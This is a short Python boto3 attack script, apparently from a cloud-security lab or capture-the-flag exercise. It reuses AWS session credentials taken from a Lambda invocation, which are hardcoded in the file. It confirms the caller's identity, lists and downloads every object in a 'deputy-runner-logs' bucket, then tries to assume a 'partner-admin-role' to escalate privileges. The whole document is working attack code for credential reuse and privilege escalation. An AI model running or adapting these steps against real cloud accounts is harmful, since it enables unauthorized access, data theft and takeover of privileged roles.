import boto3
import json
import urllib3
urllib3.disable_warnings()

ENDPOINT = "https://web-d94df0e990e63e98.web.h7tex.com"
REGION = "us-east-1"

# Credentials from Lambda invocation
RUNNER_KEY = "ASIA5D40A02C98BE2846"
RUNNER_SECRET = "sk/zUEcqj_aoJnJO7AC33lA7XnhJffTtvk_"
RUNNER_TOKEN = "tok/okEdeZlbPh4Z4GZ5opCKuxph-VBu4sYuzR31D6a03uFZH7lp9cl8BmJI_1qfb3HZ"

runner_session = boto3.Session(
    aws_access_key_id=RUNNER_KEY,
    aws_secret_access_key=RUNNER_SECRET,
    aws_session_token=RUNNER_TOKEN,
    region_name=REGION
)

print("[*] Testing runner STS identity...")
sts_runner = runner_session.client("sts", endpoint_url=ENDPOINT, verify=False)
ident = sts_runner.get_caller_identity()
print("[+] Runner Identity:", json.dumps(ident, indent=2))

print("\n[*] Inspecting deputy-runner-logs bucket...")
s3_runner = runner_session.client("s3", endpoint_url=ENDPOINT, verify=False)
try:
    res = s3_runner.list_objects_v2(Bucket="deputy-runner-logs")
    print("[+] Objects in deputy-runner-logs:", json.dumps(res, indent=2, default=str))
    for obj in res.get("Contents", []):
        key = obj["Key"]
        print(f"[*] Fetching {key}...")
        body = s3_runner.get_object(Bucket="deputy-runner-logs", Key=key)["Body"].read().decode()
        print(f"--- Content of {key} ---\n{body}\n--------------------")
except Exception as e:
    print("[-] S3 error:", e)

print("\n[*] Testing AssumeRole into partner-admin-role...")
try:
    assumed = sts_runner.assume_role(
        RoleArn="arn:aws:iam::999999999999:role/partner-admin-role",
        RoleSessionName="stage3_session"
    )
    print("[+] Assumed Role successfully:", json.dumps(assumed, indent=2, default=str))
except Exception as e:
    print("[-] AssumeRole error:", e)
